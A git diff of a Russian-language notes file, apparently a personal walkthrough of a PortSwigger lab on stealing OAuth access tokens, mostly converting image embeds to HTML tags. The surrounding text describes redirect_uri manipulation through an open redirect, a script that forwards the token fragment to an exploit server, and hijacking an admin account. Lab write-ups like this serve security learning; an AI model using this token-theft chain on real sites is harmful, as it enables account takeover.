@@ -61,14 +61,17 @@ https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-token
 
 # разведка/логика работы
 нашел запрос который при исполнении в браузере берет мои куки данные сайта и отправляет запрос на получение токена доступа
-![[dcwec.png]]
+<img src="../../assets/dcwec.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
+
 
 остнется только украсть токен и одставить в мой валидый запрос вот сюда:
-![[cfhvgj86.png]]
+<img src="../../assets/cfhvgj86.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
+
 
 
 и потом используя этот токен можно войти в аккаунт
-![[wfvwlj.png]]
+<img src="../../assets/wfvwlj.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
+
 
 **можно пробовать подменить редирект тут**
 GET /auth?client_id=vul2o5rfwp7mwvedsomvy&redirect_uri=https://0a02000e0400ba5182fc8d74004f009f.web-security-academy.net/oauth-callback&response_type=token&nonce=-1162128522&scope=openid%20profile%20email HTTP/1.1
@@ -77,7 +80,8 @@ GET /auth?client_id=vul2o5rfwp7mwvedsomvy&redirect_uri=https://0a02000e0400ba518
 
 редирект позволяет подставить свой URL но проблема
 редирект # блокирует передачу токена в сам URL
-![[eafv34.png]]
+<img src="../../assets/eafv34.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
+
 
 # СМЫСЛ - ЗАЩИТА в виде # решетки
   **То есть токен приходит в ответе OAuth-сервера.** Мы видим его в **заголовке `Location`** HTTP-ответа. Этот ответ **перехватывается Burp** (или  exploit-сервером), потому что он — часть HTTP-диалога между браузером жертвы и OAuth-сервером.
@@ -104,18 +108,21 @@ GET /auth?client_id=vul2o5rfwp7mwvedsomvy&redirect_uri=https://0a02000e0400ba518
 этот запрос возвращает код доступа после привязки!
 
 я взял этот запрос и подменил в нем редирект на свой, но сервер не принял мой произвольный URL^
-![[cfghvbj4.png]]
+<img src="../../assets/cfghvbj4.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
 
+<img src="../../assets/sfv983.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
 это страница поста
-![[sfv983.png]]
+
 
 изменил путь - сервер позволил мне подставить путь к посту
 и также вернул код токен-доступа
-![[feverw2.png]]
+<img src="../../assets/feverw2.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
+
 
 теперь проверим,  проверяется ли на странице поста редиректы?
 подставил свой редирект
-![[sefv34.png]]
+<img src="../../assets/sefv34.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
+
 
 и удалось открыть страницу https://0ada0046049f5da4813f341500870047.web-security-academy.net/post?postId=1#access_token=4OV-v4iHk3510SDLKTPxu3RG_i7kT3P6Gw3gxOiZZvD&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
 
@@ -124,14 +131,16 @@ GET /auth?client_id=vul2o5rfwp7mwvedsomvy&redirect_uri=https://0a02000e0400ba518
 на странице поста не  получилост подставить свой URL так как по логике там принимается только цифры
 
 но запрос на получение NEXT PAGE позволяет прописать любой URL и сервер не отвергает его , 
+<img src="../../assets/rvre.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
 
-![[rvre.png]]
+
 
 
 значит и атаку можно будет построить на этом!
 
 я подставил этот путь на тот запрос который возкращает нам токен доступа (этот запрос позже будем отправлять жертве)
-![[ufjl.png]]
+<img src="../../assets/ufjl.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
+
 
 в самом начале когда я пытался подменить тут адрес в редиректе - то сервер блокировал его, а тепеь после поставновки пути (как при переходе на страницу блога) сервер не проверяет сторонние адреса!
 
@@ -142,7 +151,8 @@ GET /auth?client_id=vul2o5rfwp7mwvedsomvy&redirect_uri=https://0a02000e0400ba518
 и получил в отвере преход на свою страницу
 и получил в ответе и токен и редирект на мою страницу! браво!
 теперь осталось мне сохранить всю эту активность которая происходит на моей странице!
-![[458237654.png]]
+<img src="../../assets/458237654.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
+
 
 
 URL запроса выше я поместил в скрипт
@@ -177,7 +187,8 @@ window.location = '/?'+document.location.hash.substr(1)
 -----
 
 теперь я подставил токен в запрос который авторизирует меня по токену доступа, и я привязал свою соц сеть к аккаунту админа которому был доставлен мой эксплойт!
-![[frg8u7.png]]
+<img src="../../assets/frg8u7.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
+
 
 ----------
 
